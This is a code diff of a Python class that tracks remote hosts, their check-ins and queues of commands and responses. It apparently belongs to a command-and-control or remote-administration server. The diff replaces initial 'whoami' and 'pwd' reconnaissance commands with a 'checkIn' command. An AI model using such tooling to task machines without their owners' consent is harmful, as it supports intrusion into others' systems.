@@ -11,29 +11,37 @@ class Host:
         self.commandCounter = 0
         self.lastCheckIn = ""
         self.alive = alive
-        self.addCommand('whoami')
-        self.addCommand('pwd')
+        self.addCommand('checkIn') #Command 0 is always "checkIn" and has no response
     
     def __repr__(self):
         return self.id
     
     def addCommand(self,command):
+        """
+        Adds a command to the hosts history of commands.
+        """
         self.commands[self.commandCounter] = Command(self.commandCounter, command)
         self.commandCounter += 1
         print("Added command successfully.")
 
     def addResponse(self,cmd_id, resp):
-        self.commands[cmd_id].response = resp
+        """
+        Adds a response to a command.
+        """
+        self.commands[int(cmd_id)].response = resp
     
     def getQueuedCommands(self):
+        """
+        Returns a JSON formatted string of the count of commands, and commands without responses.
+        """
         command_count = 0
         queuedCommands = ""
         for i in range(len(self.commands)):
             if not self.commands[i].response:
                 command_count += 1
                 if i == len(self.commands) - 1: #if it's the last one, don't include a ,
-                    queuedCommands += f'"{i}": {str(self.commands[i])}'
+                    queuedCommands += f'"{command_count}": {str(self.commands[i])}'
                 else:
-                    queuedCommands += f'"{i}": {str(self.commands[i])},'
-        queuedCommands = "{" + f'"command_count":"{command_count}",' +queuedCommands + "}"
+                    queuedCommands += f'"{command_count}": {str(self.commands[i])},'
+        queuedCommands = "{" + f'"command_count":"{command_count}",' +queuedCommands + "}" if queuedCommands else "{" + f'"command_count":"{command_count}"' + "}"
         return str(queuedCommands)
